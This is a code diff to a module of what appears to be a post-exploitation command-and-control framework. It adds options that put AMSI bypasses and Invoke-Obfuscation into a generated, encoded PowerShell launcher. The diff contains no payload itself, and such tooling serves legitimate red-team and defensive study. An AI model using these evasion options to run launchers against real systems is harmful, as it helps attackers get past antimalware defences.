@@ -95,7 +95,27 @@ class Module(object):
                 'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required': False,
                 'Value': 'default'
-            }
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
         }
         
         # save off a copy of the mainMenu object to access external functionality
@@ -128,7 +148,22 @@ class Module(object):
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
-        
+        amsibypass = self.options['AMSIBypass']['Value']
+        amsibypass2 = self.options['AMSIBypass2']['Value']
+        obfuscatebool = self.options['Obfuscate']['Value']
+        obfuscatecommand = self.options['ObfuscateCommand']['Value']
+
+        invokeObfuscation = False
+        if obfuscatebool.lower() == "true":
+            invokeObfuscation = True
+        AMSIBypassBool = False
+        if amsibypass.lower() == "true":
+            AMSIBypassBool = True
+
+        AMSIBypass2Bool = False
+        if amsibypass2.lower() == "true":
+            AMSIBypass2Bool = True
+
         statusMsg = ""
         locationString = ""
         
@@ -186,7 +221,7 @@ class Module(object):
                 # generate the PowerShell one-liner with all of the proper options set
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
                                                                    userAgent=userAgent, proxy=proxy,
-                                                                   proxyCreds=proxyCreds)
+                                                                   proxyCreds=proxyCreds, obfuscate=invokeObfuscation, obfuscationCommand=obfuscatecommand,AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)
                 
                 encScript = launcher.split(" ")[-1]
                 statusMsg += "using listener " + listenerName
